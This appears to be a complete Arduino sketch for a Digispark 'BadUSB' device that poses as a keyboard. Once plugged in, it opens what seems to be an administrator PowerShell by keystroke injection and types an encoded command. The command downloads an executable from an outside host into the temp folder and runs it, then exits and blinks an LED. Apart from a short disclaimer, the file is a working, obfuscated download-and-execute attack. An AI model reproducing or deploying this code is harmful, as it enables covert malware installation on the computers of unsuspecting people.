#include "DigiKeyboard.h"

//encoded string is decoded and executed at runtime, downloads and executes payload
//educational purposes only!
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
   DigiKeyboard.sendKeyStroke(KEY_A);
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
   DigiKeyboard.delay(300);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.println("powershell -encodedcommand dwBnAGUAdAAgACIAZQB4AHQAcgBhAGIAeQB0AGUALgBzAHkAdABlAHMALgBuAGUAdAAvAGIAYQBkAHUAcwBiAC4AZQB4AGUAIgAgAC0AbwB1AHQAZgBpAGwAZQAgACIAJABlAG4AdgA6AHQAZQBtAHAALwBiAGEAZAB1AHMAYgAuAGUAeABlACIAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiACQAZQBuAHYAOgB0AGUAbQBwAC8AYgBhAGQAdQBzAGIALgBlAHgAZQAiADsAIABlAHgAaQB0ADsA");
   DigiKeyboard.println("exit");
   blinkLED();
}

//PWM to smoothly blink LED
void blinkLED(){
  byte brightness = 0;
  byte inc = 15; 
  while(1){
    analogWrite(1, brightness);
    brightness += inc;
    if(brightness <= 0 || brightness >= 75)
      inc = -inc;
    delay(50);
  }
}
